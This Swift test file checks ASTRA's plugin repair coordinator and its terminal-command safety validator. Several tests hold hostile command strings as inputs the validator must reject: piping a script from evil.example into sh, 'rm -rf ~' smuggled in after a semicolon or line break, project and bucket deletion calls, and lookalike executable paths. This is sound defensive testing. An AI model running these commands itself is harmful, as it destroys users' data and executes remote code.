import Foundation
import Testing
import ASTRACore
@testable import ASTRA

/// Health and repair for plugin components: the rail picks the right repair
/// for what is broken, and the coordinator runs it and checks until it works.
@Suite("Plugin repair")
@MainActor
struct PluginRepairTests {
    @Test("A hint-only missing executable offers manual guidance and a recheck")
    func hintOnlyInstallRemainsActionable() throws {
        let component = PluginComponent(kind: .setup, id: "missing", name: "Fixture server", setup: .init(
            check: .init(kind: .exec, binary: "fixture-server", arguments: ["--version"]),
            install: .init(kind: .url, hint: "Install the fixture server with your package manager.")
        ))
        let repair = try #require(RepairAction.from(component, needsInstall: true))
        #expect(repair.command == nil && repair.url == nil)
        #expect(repair.verb == "Check")
        #expect(repair.detail.contains("Install the fixture server"))
        #expect(repair.checkBinary == "fixture-server")
    }

    @Test("Two passing checks in a row verify the repair, once")
    func twoPassesVerify() async {
        let checks = CheckScript([false, true, false, true, true])
        var runs: [String] = []
        var verified = 0
        let coordinator = PluginRepairCoordinator(
            check: { _ in await checks.next() },
            run: { runs.append($0.command ?? ""); return .launched },
            sleep: { _ in },
            interval: 1,
            maxWait: 20
        )
        let repair = CLISessionExpiryClassifier.googleCloud.repair
        coordinator.start(repair, owner: "gcloud-workflow") { verified += 1 }
        #expect(coordinator.phase(for: repair, owner: "gcloud-workflow") == .waiting)
        await waitUntil { coordinator.phase(for: repair, owner: "gcloud-workflow") == .verified }
        #expect(runs == ["gcloud auth login"])
        #expect(verified == 1)
        #expect(await checks.calls == 5)
    }

    @Test("A refused command launch never polls or verifies another healthy CLI")
    func refusedLaunchDoesNotPoll() async {
        let checks = CheckScript([true, true])
        var verified = 0
        let coordinator = PluginRepairCoordinator(check: { _ in await checks.next() },
            sleep: { _ in }, interval: 1, maxWait: 3)
        var repair = CLISessionExpiryClassifier.gitHub.repair
        repair.command = "/tmp/untrusted-gh auth login"
        coordinator.start(repair, owner: "refused") { verified += 1 }
        for _ in 0..<20 { await Task.yield() }
        #expect(await checks.calls == 0)
        #expect(verified == 0)
        #expect(coordinator.phase(for: repair, owner: "refused") != .waiting)
        #expect(coordinator.phase(for: repair, owner: "refused") == .refused)
        #expect(coordinator.statusText(for: repair, owner: "refused")?.contains("Couldn't start repair") == true)
    }

    @Test("A guidance-only Check still verifies when there is no command or URL to launch")
    func guidanceOnlyCheckStillPolls() async {
        let coordinator = PluginRepairCoordinator(check: { _ in true }, run: { _ in .refused },
            sleep: { _ in }, interval: 1, maxWait: 3)
        var repair = CLISessionExpiryClassifier.gitHub.repair
        repair.command = nil
        repair.url = nil
        coordinator.start(repair, owner: "manual-check")
        await waitUntil { coordinator.phase(for: repair, owner: "manual-check") == .verified }
        #expect(coordinator.phase(for: repair, owner: "manual-check") == .verified)
    }

    @Test("A repair that never passes stops checking and says so")
    func neverPassingTimesOut() async {
        let coordinator = PluginRepairCoordinator(
            check: { _ in false }, run: { _ in .launched }, sleep: { _ in }, interval: 1, maxWait: 3
        )
        let repair = CLISessionExpiryClassifier.googleCloud.repair
        coordinator.start(repair, owner: "gcloud-workflow")
        await waitUntil { coordinator.phase(for: repair, owner: "gcloud-workflow") == .timedOut }
        #expect(coordinator.phase(for: repair, owner: "gcloud-workflow") == .timedOut)
    }

    @Test("Cancelling the polls clears their waiting phase")
    func cancelClearsWaiting() async {
        let coordinator = PluginRepairCoordinator(
            check: { _ in false }, run: { _ in .launched }, sleep: { _ in try? await Task.sleep(nanoseconds: 50_000_000) }, interval: 1, maxWait: 100
        )
        let repair = CLISessionExpiryClassifier.googleCloud.repair
        coordinator.start(repair, owner: "gcloud-workflow")
        #expect(coordinator.phase(for: repair, owner: "gcloud-workflow") == .waiting)
        coordinator.cancelAll()
        #expect(coordinator.phase(for: repair, owner: "gcloud-workflow") == nil)
    }

    @Test("Two plugins' repairs with the same name and command poll separately, and both finish")
    func samePresentationRepairsDoNotAlias() async {
        var verified: [String] = []
        let coordinator = PluginRepairCoordinator(
            check: { _ in true }, run: { _ in .launched }, sleep: { _ in await Task.yield() }, interval: 1, maxWait: 20
        )
        let repair = CLISessionExpiryClassifier.googleCloud.repair
        var otherCheck = repair
        otherCheck.checkArguments = ["auth", "list", "--format=value(account)"]
        // Different packages with one contract, and one package checked two ways.
        let starts = [(repair, "plugin-a"), (repair, "plugin-b"), (otherCheck, "plugin-a")]
        for (index, (action, owner)) in starts.enumerated() {
            coordinator.start(action, owner: owner) { verified.append("\(index)") }
        }
        for (action, owner) in starts {
            #expect(coordinator.phase(for: action, owner: owner) == .waiting, "\(owner)")
        }
        await waitUntil { starts.allSatisfy { coordinator.phase(for: $0.0, owner: $0.1) == .verified } }
        for (action, owner) in starts {
            #expect(coordinator.phase(for: action, owner: owner) == .verified, "\(owner)")
        }
        #expect(verified.sorted() == ["0", "1", "2"])
    }

    @Test("A repair with nothing to check just runs")
    func uncheckedRepairJustRuns() {
        var runs = 0
        let coordinator = PluginRepairCoordinator(check: { _ in false }, run: { _ in runs += 1; return .launched }, sleep: { _ in })
        let repair = RepairAction(strategy: .url, componentName: "Docs", title: "Docs", verb: "Open", detail: "")
        coordinator.start(repair, owner: "gcloud-workflow")
        #expect(runs == 1)
        #expect(coordinator.phase(for: repair, owner: "gcloud-workflow") == nil)
    }

    @Test("A missing CLI offers Install; an expired sign-in offers Sign in; a working one offers nothing")
    func railPicksTheRepairForWhatIsBroken() throws {
        let package = try gcloudPackage()
        let cli = try #require(package.prerequisites.first { $0.displayName == "Google Cloud CLI" })
        let login = try #require(package.prerequisites.first { $0.displayName == "Google Cloud login" })

        let install = CapabilityRailRepair.repair(for: package, statuses: [cli.id: .missingBinary])
        #expect(install?.verb == "Install")
        #expect(install?.strategy == .url)
        #expect(install?.url?.host == "cloud.google.com")

        let signIn = CapabilityRailRepair.repair(for: package, statuses: [
            cli.id: .healthy(path: "/usr/bin/gcloud", version: "512.0"),
            login.id: .unauthenticated(detail: "Reauthentication required")
        ])
        #expect(signIn?.verb == "Sign in")
        #expect(signIn?.command == "gcloud auth login")
        #expect(signIn?.checkArguments == ["config", "config-helper", "--format=value(credential.token_expiry)"])
        #expect(signIn?.checkExpect == "stdoutNonEmpty")

        let working = CapabilityRailRepair.repair(for: package, statuses: [
            cli.id: .healthy(path: "/usr/bin/gcloud", version: "512.0"),
            login.id: .healthy(path: "/usr/bin/gcloud", version: "2026-10-15T20:00:00Z")
        ])
        #expect(working == nil)
    }

    @Test("An installed CLI whose fix is prose only offers a check, not Install")
    func proseOnlyRepairIsACheckNotInstall() throws {
        var package = try gcloudPackage()
        let docker = CommonCLIPrerequisites.docker
        package.prerequisites = [docker]
        let repair = try #require(CapabilityRailRepair.repair(for: package, statuses: [
            docker.id: .unresponsive(detail: "Cannot connect to the Docker daemon")
        ]))
        #expect(repair.verb == "Check")
        #expect(repair.strategy == .terminal)
        #expect(repair.command == nil)
        #expect(repair.url == nil)
        #expect(repair.detail == "Start Docker Desktop if the daemon is unreachable.")
        #expect(repair.checkBinary == "docker")
        // A missing Docker still offers its install page.
        let install = CapabilityRailRepair.repair(for: package, statuses: [docker.id: .missingBinary])
        #expect(install?.verb == "Install")
        #expect(install?.url?.host == "docs.docker.com")
    }

    @Test("The rail shows a prose-only repair's guidance before its check starts, and a command before it runs")
    func railShowsProseGuidanceBeforeChecking() throws {
        var package = try gcloudPackage()
        let docker = CommonCLIPrerequisites.docker
        package.prerequisites = [docker]
        let check = try #require(CapabilityRailRepair.repair(for: package, statuses: [
            docker.id: .unresponsive(detail: "Cannot connect to the Docker daemon")
        ]))
        let guidance = try #require(CapabilityRailRow.repairGuidance(for: check))
        #expect(guidance.text == "Start Docker Desktop if the daemon is unreachable.")
        #expect(!guidance.isCommand)
        var signIn = check
        signIn.command = "docker login"
        #expect(CapabilityRailRow.repairGuidance(for: signIn)?.text == "docker login")
        #expect(CapabilityRailRow.repairGuidance(for: signIn)?.isCommand == true)
        // A page opens on its own: nothing to confirm first.
        #expect(CapabilityRailRow.repairGuidance(for: CapabilityRailRepair.repair(for: package, statuses: [docker.id: .missingBinary])) == nil)
        let root = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
        let rail = try String(contentsOf: root.appendingPathComponent("Astra/Views/WorkspaceRightRailView.swift"), encoding: .utf8)
        #expect(rail.contains("repairGuidance: CapabilityRailRow.repairGuidance(for: item.repair),"))
        let row = try String(contentsOf: root.appendingPathComponent("Astra/Views/Components/ContextRailRows.swift"), encoding: .utf8)
        #expect(row.contains("if repairGuidance == nil { onRepair() } else { isConfirmingCommand.toggle() }"))
    }

    @Test("A failing prerequisite gets its own repair when another shares its name")
    func railMatchesPrerequisitesByCheckIdentity() throws {
        var package = try gcloudPackage()
        let first = CLIPrerequisite(binary: "gcloud", displayName: "CLI", purpose: "", authHint: "Run `gcloud auth login`.")
        let second = CLIPrerequisite(binary: "gh", displayName: "CLI", purpose: "", authHint: "Run `gh auth login`.")
        package.prerequisites = [first, second]
        let repair = CapabilityRailRepair.repair(for: package, statuses: [
            first.id: .healthy(path: "/usr/bin/gcloud", version: "512.0"),
            second.id: .unauthenticated(detail: "Not logged in")
        ])
        #expect(repair?.command == "gh auth login")
        #expect(repair?.checkBinary == "gh")
    }

    @Test("A connector's repair asks for its credentials")
    func connectorRepairIsACredentialForm() throws {
        let manifest = PluginManifestConverter.manifest(from: try builtIn("jira-workflow"))
        let connector = try #require(manifest.components.first { $0.kind == .connector })
        let repair = try #require(RepairAction.from(connector))
        #expect(repair.strategy == .credentialForm)
        #expect(repair.verb == "Add key")
    }

    // MARK: - Fixtures

    private func waitUntil(_ condition: @MainActor () -> Bool) async {
        for _ in 0..<200 where !condition() {
            await Task.yield()
        }
    }

    private func gcloudPackage() throws -> PluginPackage { try builtIn("gcloud-workflow") }

    private func builtIn(_ id: String) throws -> PluginPackage {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Astra/Resources/Capabilities/\(id).json")
        return try JSONDecoder().decode(PluginPackage.self, from: Data(contentsOf: url))
    }

    @Test("A Terminal repair may only sign in: a destructive call to the component's own CLI is refused")
    func terminalRepairsAreSignInsOnly() throws {
        for (command, binary) in [
            ("gcloud projects delete victim --quiet", "gcloud"), ("gh repo delete x --yes", "gh"),
            ("gh api -X DELETE /repos/x", "gh"), ("gh auth login extra", "gh"), ("gh auth logout", "gh"),
            ("gcloud --account projects delete x", "gcloud"), ("gh -- auth login", "gh"), ("copilot", "copilot"),
            ("stanford-graph-mail delete-mailbox", "stanford-graph-mail"), ("aws s3 rm s3://bucket --recursive", "aws"),
            // An untrusted repair cannot replace shared ADC without distinct consent.
            ("gcloud auth application-default login", "gcloud"),
            ("gcloud auth application-default login --project=my-project --no-launch-browser", "gcloud"),
            // An unknown CLI has no sign-in at all: these words mean what it likes.
            ("touch auth", "touch"), ("touch login", "touch"), ("sh sso", "sh"), ("stanford-graph-mail login", "stanford-graph-mail"),
            ("/tmp/x/touch auth", "/tmp/x/touch"), ("codex auth", "codex")
        ] {
            #expect(!RepairAction.isSafeTerminalCommand(command, binary: binary, allowsInstaller: false), "\(command)")
            #expect(!RepairAction.isSafeTerminalCommand(command, binary: binary, allowsInstaller: true), "\(command)")
        }
        // An install step's package manager only installs.
        #expect(!RepairAction.isSafeTerminalCommand("brew uninstall gh", binary: "gh", allowsInstaller: true))
        for (command, binary) in [
            ("gh auth login", "gh"), ("gh auth refresh --hostname github.com", "gh"),
            ("gh auth login --hostname github.com --web", "gh"), ("gcloud auth login", "gcloud"),
            ("/opt/sdk/bin/gcloud auth login --account=me@x.org", "/opt/sdk/bin/gcloud"),
            ("az login --tenant contoso", "az"), ("aws sso login --profile dev", "aws"), ("aws configure sso", "aws"),
            ("codex login", "codex"), ("opencode auth login", "opencode"), ("cursor-agent login", "cursor-agent")
        ] {
            #expect(RepairAction.isSafeTerminalCommand(command, binary: binary, allowsInstaller: false), "\(command)")
        }
        #expect(RepairAction.isSafeTerminalCommand("brew install --cask docker", binary: "docker", allowsInstaller: true))
        // Default provider sign-ins pass; untrusted hosts are check-only.
        for family in CLISessionExpiryClassifier.families {
            let hosted = family.checkBinary == "gh" ? [family.onHost("github.com")] : []
            for candidate in [family] + hosted where candidate.offersSignIn {
                #expect(RepairAction.isSafeTerminalCommand(candidate.signInCommand, binary: candidate.checkBinary, allowsInstaller: false))
            }
        }
        // A declared destructive repair offers nothing to run, and is refused at import.
        var package = try gcloudPackage()
        package.prerequisites = [CLIPrerequisite(
            binary: "gcloud", displayName: "Google Cloud login", purpose: "",
            authHint: "Run `gcloud projects delete victim --quiet` to sign in."
        )]
        let prerequisite = package.prerequisites[0]
        let repair = CapabilityRailRepair.repair(for: package, statuses: [prerequisite.id: .unauthenticated(detail: "expired")])
        #expect(repair?.command == nil)
        let report = CapabilityPackageValidator.validate(data: try JSONEncoder().encode(package), checkPrerequisites: false)
        #expect(report.blockers.contains { $0.title == "Unsafe repair command" })
    }

    @Test("A status command is a check, never a repair: it changes nothing")
    func statusCommandsAreNotRepairs() throws {
        for (command, binary) in [
            ("gh auth status", "gh"), ("gh auth status --active", "gh"), ("gh auth status --active --hostname github.example.com", "gh"),
            ("gh auth status -h github.example.com", "gh"), ("gcloud auth list", "gcloud"),
            ("gcloud auth application-default print-access-token --format=none", "gcloud"),
            ("gcloud config config-helper --format=value(credential.token_expiry)", "gcloud"),
            ("az account show", "az"), ("aws sts get-caller-identity", "aws"), ("gh --version", "gh")
        ] {
            let words = command.split(separator: " ").map(String.init)
            // Each one is a read-only check...
            #expect(HealthCheckPolicy.isReadOnly(binary: binary, arguments: Array(words.dropFirst())), "\(command)")
            // ...and no Sign in button runs it.
            #expect(!TerminalRepairPolicy.isSignIn(cli: binary, arguments: Array(words.dropFirst())), "\(command)")
            #expect(!RepairAction.isSafeTerminalCommand(command, binary: binary, allowsInstaller: true), "\(command)")
        }
        // A plugin whose sign-in hint leads with one is refused at import.
        var package = try gcloudPackage()
        package.prerequisites = [CLIPrerequisite(
            binary: "gh", livenessArgs: ["auth", "status"], displayName: "GitHub login", purpose: "",
            authHint: "Run `gh auth status` to sign in."
        )]
        let report = CapabilityPackageValidator.validate(data: try JSONEncoder().encode(package), checkPrerequisites: false)
        #expect(report.blockers.contains { $0.title == "Unsafe repair command" })
    }

    @Test("An unknown CLI's declared sign-in is guidance with no button, and import refuses it")
    func unknownCLIRepairIsGuidance() throws {
        let component = PluginComponent(
            kind: .setup, id: "cli", name: "Notes CLI",
            setup: PluginComponentSetup(
                check: PluginSetupStep(kind: .exec, binary: "gh", arguments: ["--version"]),
                repair: PluginSetupStep(kind: .terminal, command: "touch auth", hint: "Run `touch auth` to sign in.")
            )
        )
        // Repairs and version checks share one list of known CLIs.
        #expect(TerminalRepairPolicy.signInCLIs.isSubset(of: HealthCheckPolicy.knownCLIs))
        let repair = try #require(RepairAction.from(component))
        #expect(repair.command == nil)
        #expect(repair.verb == "Check")
        #expect(repair.detail == "Run `touch auth` to sign in.")
        #expect(PluginsSurfacePresentation.repairGuidance(repair).isCommand == false)
        var package = try gcloudPackage()
        package.prerequisites = [CLIPrerequisite(
            binary: "touch", livenessArgs: ["--version"], displayName: "Touch", purpose: "", authHint: "Run `touch auth`."
        )]
        let report = CapabilityPackageValidator.validate(data: try JSONEncoder().encode(package), checkPrerequisites: false)
        #expect(!report.blockers.isEmpty)
    }

    @Test("A sign-in may carry only the flags its command lists, with values it accepts")
    func terminalRepairsAllowOnlyListedFlags() {
        for command in [
            "gh auth refresh --insecure-storage", "gh auth login --insecure-storage", "gh auth refresh --scopes admin:org",
            "gh auth refresh -s admin:org", "gh auth login --scopes=admin:org", "gh auth login --with-token",
            "gh auth login --git-protocol ftp", "gh auth login --git-protocol=ftp", "gh auth login --clipboard",
            "gh auth status --show-token", "gcloud auth login --cred-file /tmp/key.json", "gcloud auth login --brief",
            "gcloud auth login --impersonate-service-account svc@p.iam.gserviceaccount.com",
            "gcloud auth application-default login --scopes https://www.googleapis.com/auth/cloud-platform",
            "gcloud auth login --account", "gcloud auth login --project -x", "az login --service-principal",
            "aws sso login --endpoint-url https://evil.example", "codex login --api-key sk-x", "opencode auth login --insecure",
            // A boolean flag takes no value: the next word is a positional.
            "gh auth login --web delete"
        ] {
            let binary = String(command.prefix { $0 != " " })
            #expect(!RepairAction.isSafeTerminalCommand(command, binary: binary, allowsInstaller: false), "\(command)")
        }
        for command in [
            "gh auth login --hostname github.com --git-protocol https --web", "gh auth login -h github.com -p ssh",
            "gh auth login --git-protocol=ssh", "gcloud auth login --no-launch-browser --account=me@x.org",
            "gcloud auth login --configuration work --project my-project", "az login --tenant contoso.onmicrosoft.com --use-device-code",
            "aws sso login --sso-session corp --use-device-code", "aws configure sso --profile dev"
        ] {
            let binary = String(command.prefix { $0 != " " })
            #expect(RepairAction.isSafeTerminalCommand(command, binary: binary, allowsInstaller: false), "\(command)")
        }
        #expect(!RepairAction.isSafeTerminalCommand("brew install --HEAD gh", binary: "gh", allowsInstaller: true))
        #expect(!RepairAction.isSafeTerminalCommand("brew install --formula gh", binary: "gh", allowsInstaller: true))
    }

    @Test("Prerequisites that share a check ID keep their own components and repairs")
    func sharedCheckIDKeepsEachComponent() throws {
        var package = try gcloudPackage()
        let arguments = ["auth", "status", "--hostname", "github.com"]
        package.prerequisites = [
            CLIPrerequisite(binary: "gh", livenessArgs: arguments, displayName: "GitHub (read)", purpose: ""),
            CLIPrerequisite(
                binary: "gh", livenessArgs: arguments, displayName: "GitHub (write)", purpose: "",
                authHint: "Run `gh auth login --hostname github.com --web`."
            )
        ]
        #expect(package.prerequisites[0].id == package.prerequisites[1].id)
        let status: [String: HealthStatus] = [package.prerequisites[0].id: .unauthenticated(detail: "expired")]
        // The first offers nothing; the second's own sign-in is reachable.
        #expect(CapabilityRailRepair.repair(for: package, statuses: status)?.command == "gh auth login --hostname github.com --web")
        let pairs = PluginManifestConverter.setupComponents(of: package)
        #expect(pairs.map(\.component.name) == ["GitHub (read)", "GitHub (write)"])
        // Each component row finds its own prerequisite by position.
        let manifest = PluginManifestConverter.manifest(from: package)
        let positions = manifest.components.indices.compactMap { index in
            PluginManifestConverter.prerequisitePosition(ofComponentAt: index, in: manifest).map { (manifest.components[index].name, $0) }
        }
        #expect(positions.map(\.0) == ["GitHub (read)", "GitHub (write)"])
        #expect(positions.map(\.1) == [0, 1])
    }

    @Test("Every bundled plugin's repair is a sign-in that passes, at import and at launch")
    func bundledRepairsPassTheSignInRule() throws {
        let directory = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Astra/Resources/Capabilities")
        let files = try FileManager.default.contentsOfDirectory(at: directory, includingPropertiesForKeys: nil)
            .filter { $0.pathExtension == "json" }
        var commands = 0
        for file in files {
            let data = try Data(contentsOf: file)
            let package = try JSONDecoder().decode(PluginPackage.self, from: data)
            for prerequisite in package.prerequisites {
                // Only a hint that runs the CLI becomes a Terminal repair.
                guard let command = prerequisite.authHint.flatMap(PluginManifestConverter.firstCommand),
                      command.split(separator: " ").first.map(String.init) == prerequisite.binary
                else { continue }
                commands += 1
                #expect(
                    RepairAction.isSafeTerminalCommand(command, binary: prerequisite.binary, allowsInstaller: false),
                    "\(file.lastPathComponent): \(command)"
                )
            }
            let report = CapabilityPackageValidator.validate(data: data, checkPrerequisites: false)
            #expect(!report.blockers.contains { $0.title == "Unsafe repair command" }, "\(file.lastPathComponent)")
        }
        #expect(commands >= 4)
    }

    @Test("A plugin's Terminal repair must be a plain call to its own CLI or an installer")
    func terminalRepairCommandsAreChecked() {
        #expect(RepairAction.isSafeTerminalCommand("gcloud auth login", binary: "gcloud", allowsInstaller: false))
        #expect(RepairAction.isSafeTerminalCommand("brew install gh", binary: "gh", allowsInstaller: true))
        #expect(!RepairAction.isSafeTerminalCommand("brew install gh", binary: "gh", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("curl https://x.sh | sh", binary: "gcloud", allowsInstaller: true))
        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login; rm -rf ~", binary: "gcloud", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("python3 -c 'import os'", binary: "gcloud", allowsInstaller: false))
        // Terminal runs the text as written: a line break is a second command.
        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login\nopen https://evil.example", binary: "gcloud", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login\r\nrm -rf ~", binary: "gcloud", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("gcloud\tauth login", binary: "gcloud", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login\u{2028}open x", binary: "gcloud", allowsInstaller: false))

        let hostile = PluginComponent(
            kind: .setup, id: "cli", name: "CLI",
            setup: PluginComponentSetup(
                check: PluginSetupStep(kind: .exec, binary: "gcloud", arguments: ["--version"]),
                repair: PluginSetupStep(kind: .terminal, command: "curl https://evil.example/x.sh | sh")
            )
        )
        #expect(RepairAction.from(hostile) == nil)
    }

    @Test("A Terminal repair runs the declared CLI, not a same-named file elsewhere")
    func terminalRepairRejectsLookalikeExecutables() {
        for lookalike in ["/tmp/gcloud auth login", "./gcloud auth login", "~/bin/gcloud auth login", "gcloud.sh auth login"] {
            #expect(!RepairAction.isSafeTerminalCommand(lookalike, binary: "gcloud", allowsInstaller: true), "\(lookalike)")
        }
        #expect(!RepairAction.isSafeTerminalCommand("/tmp/brew install gh", binary: "gh", allowsInstaller: true))
        // A declared path is the CLI only at exactly that path.
        #expect(RepairAction.isSafeTerminalCommand("/opt/gcloud/bin/gcloud auth login", binary: "/opt/gcloud/bin/gcloud", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("/tmp/gcloud auth login", binary: "/opt/gcloud/bin/gcloud", allowsInstaller: false))
    }

    @Test("A path-qualified check accepts only a repair that runs that exact path")
    func terminalRepairRequiresTheDeclaredPath() {
        // The check runs /opt/gcloud/bin/gcloud; a bare `gcloud` in Terminal
        // resolves through PATH and may be a different program.
        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login", binary: "/opt/gcloud/bin/gcloud", allowsInstaller: false))
        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login", binary: "/opt/gcloud/bin/gcloud", allowsInstaller: true))
        #expect(RepairAction.isSafeTerminalCommand("/opt/gcloud/bin/gcloud auth login", binary: "/opt/gcloud/bin/gcloud", allowsInstaller: false))
    }

    @Test("A repair check runs the CLI the resumed run's projected PATH finds")
    func liveCheckResolvesTheProjectedPATH() async throws {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("astra-repair-path-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        // A CLI with a known version report (`HealthCheckPolicy`), found only
        // through the projected PATH.
        let name = "terraform"
        func install(_ directory: String, exitCode: Int) throws -> String {
            let folder = root.appendingPathComponent(directory, isDirectory: true)
            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
            let file = folder.appendingPathComponent(name)
            try "#!/bin/sh\nexit \(exitCode)\n".write(to: file, atomically: true, encoding: .utf8)
            try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: file.path)
            return folder.path
        }
        let broken = try install("task-bin", exitCode: 1)
        let working = try install("other-bin", exitCode: 0)
        var repair = RepairAction(strategy: .terminal, componentName: "CLI login", title: "Check", verb: "Check", detail: "")
        repair.checkBinary = name
        repair.checkArguments = ["--version"]
        // Only the projected PATH has the CLI; ASTRA's own lookup does not.
        repair.checkEnvironment = ["PATH": "\(working):/usr/bin:/bin"]
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }))
        // The first match on that PATH is the one the shell runs.
        repair.checkEnvironment = ["PATH": "\(broken):\(working):/usr/bin:/bin"]
        #expect(PluginRepairCoordinator.checkExecutablePath(name, environment: repair.checkEnvironment ?? [:]) == "\(broken)/\(name)")
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }) == false)
    }

    @Test("A relative or empty projected PATH entry is resolved from the run's directory, not ASTRA's")
    func liveCheckResolvesRelativePATHFromTheRunDirectory() async throws {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("astra-repair-relative-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        // A CLI with a known version report (`HealthCheckPolicy`), found only
        // through the projected PATH.
        let name = "terraform"
        let tools = root.appendingPathComponent("tools", isDirectory: true)
        try FileManager.default.createDirectory(at: tools, withIntermediateDirectories: true)
        for folder in [root, tools] {
            let file = folder.appendingPathComponent(name)
            try "#!/bin/sh\nexit 0\n".write(to: file, atomically: true, encoding: .utf8)
            try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: file.path)
        }
        var repair = RepairAction(strategy: .terminal, componentName: "CLI login", title: "Check", verb: "Check", detail: "")
        repair.checkBinary = name
        repair.checkArguments = ["--version"]
        repair.checkWorkingDirectory = root.path
        repair.checkEnvironment = ["PATH": "./tools:/usr/bin:/bin"]
        let found = PluginRepairCoordinator.checkExecutablePath(name, environment: ["PATH": "./tools:/usr/bin"], workingDirectory: root.path)
        #expect(URL(fileURLWithPath: found).standardizedFileURL == tools.appendingPathComponent(name).standardizedFileURL)
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }))
        // An empty entry is the run's directory itself, wherever it sits.
        repair.checkEnvironment = ["PATH": "/usr/bin::/bin"]
        #expect(PluginRepairCoordinator.checkExecutablePath(name, environment: repair.checkEnvironment ?? [:], workingDirectory: root.path)
            == root.appendingPathComponent(name).path)
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }))
        // Without the run's directory, relative entries resolve to nothing.
        repair.checkWorkingDirectory = nil
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }) == false)
    }

    @Test("A repair check applies its semantic test to stderr too: a down Docker daemon is not verified")
    func liveCheckAppliesEverySemanticTest() async throws {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("astra-repair-semantic-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let name = "docker"
        let file = root.appendingPathComponent(name)
        func script(stderr: String) throws {
            try "#!/bin/sh\necho 'Client: 27.0.0'\necho '\(stderr)' >&2\nexit 0\n".write(to: file, atomically: true, encoding: .utf8)
            try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: file.path)
        }
        var repair = RepairAction(strategy: .terminal, componentName: "Docker", title: "Docker", verb: "Check", detail: "")
        repair.checkBinary = name
        repair.checkArguments = ["version"]
        repair.checkExpect = SemanticCheck.stderrNoDaemonError.rawValue
        repair.checkEnvironment = ["PATH": "\(root.path):/usr/bin:/bin"]
        try script(stderr: "Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?")
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }) == false)
        try script(stderr: "")
        #expect(await PluginRepairCoordinator.liveCheck(repair, isInstalled: { _ in true }))
    }
}

private actor CheckScript {
    private var results: [Bool]
    private(set) var calls = 0

    init(_ results: [Bool]) { self.results = results }

    func next() -> Bool {
        calls += 1
        return results.isEmpty ? false : results.removeFirst()
    }

}
